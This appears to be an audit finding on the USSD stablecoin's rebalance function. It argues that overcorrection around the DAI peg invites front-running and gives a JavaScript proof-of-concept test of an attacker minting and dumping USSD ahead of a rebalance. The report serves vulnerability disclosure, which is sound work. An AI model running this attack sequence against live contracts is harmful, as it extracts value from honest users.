# Front-running vulnerability due to overcorrection in rebalance function

## Summary

The `rebalance` function in the USSD contract constantly oscillates between overshooting and undershooting the peg, making it highly susceptible to front-running attacks. This is due to the nature of how the rebalancer sells and mints USSD tokens in peg-up and peg-down scenarios, respectively.

## Vulnerability Detail

During a peg-up scenario, the rebalancer aims to sell half of the difference between the USSD amount and the DAI amount in the UniswapV3Pool. This process burns the USSD and increases its value. However, it also sets up a situation where the USSD is worth more than DAI. 

During a peg-down scenario, the rebalancer mints half of the difference between the USSD amount and the DAI amount in the UniswapV3Pool. This increases the total supply of USSD and decreases its value. The value of USSD oscillates with each rebalancing, creating opportunities for front-running attacks.

## Impact

The potential for front-running can destabilize the contract's valuation and create undue opportunities for exploitation by malicious actors. This could lead to a loss of trust in the system and potential financial loss for honest users.

## POC

```js
describe('POC 4', function () {
    it('Front-running vulnerability due to overcorrection in rebalance function', async function () {
        console.log('Some user swapps DAI for USSD -> USSD value goes up')
        await uniswapExactWethForDai(this, web3.utils.toWei('10', 'ether'), user);
        let userDaiBalance = web3.utils.toBN(await this.DAI.methods.balanceOf(user).call());
        await uniswapExactDaiForUssd(this, userDaiBalance.toString(), user);

        console.log('Frontrunning attacker sees rebalance call in mempool and checks valuation')
        let currentValuation = await this.rebalancer.getOwnValuation()
        console.log('USSD valuation', currentValuation.toString());

        console.log('Frontrunning attacker uses high USSD price to swap all USSD for DAI')

        await uniswapExactWethForDai(this, web3.utils.toWei('10', 'ether'), attacker);
        let attackerDaiBalance = web3.utils.toBN(await this.DAI.methods.balanceOf(attacker).call());
        await this.DAI.methods.approve(this.USSD.address, attackerDaiBalance).send({ from: attacker });
        console.log(`Attacker got 10 ETH worth of DAI: ${attackerDaiBalance.toString()} DAI`);

        await this.USSD.mintForToken(this.DAI.options.address, attackerDaiBalance, attacker, { from: attacker });
        let attackerUssdBalance = web3.utils.toBN(await this.USSD.balanceOf(attacker));
        console.log(`Attacker mints USSD for DAI: ${attackerUssdBalance} USSD`);

        await uniswapExactUssdForDai(this, attackerUssdBalance.toString(), attacker);
        console.log(`Attacker sells all USSD for ${await this.DAI.methods.balanceOf(attacker).call()} DAI`);

        currentValuation = await this.rebalancer.getOwnValuation()
        console.log('USSD valuation', currentValuation.toString());

        console.log('USSD value droped. Rebalancing ...');
        await this.rebalancer.rebalance({ from: owner });

        currentValuation = await this.rebalancer.getOwnValuation()
        console.log('USSD valuation now again overvalued:', currentValuation.toString());
    });
});
```

## Recommendation

Consider adjusting the `rebalance` function to reduce the risk of front-running. One possible approach could be to implement a time delay or slippage tolerance in the rebalancing function, ensuring that the rebalance does not over-correct and subsequently provide an exploitable opportunity.
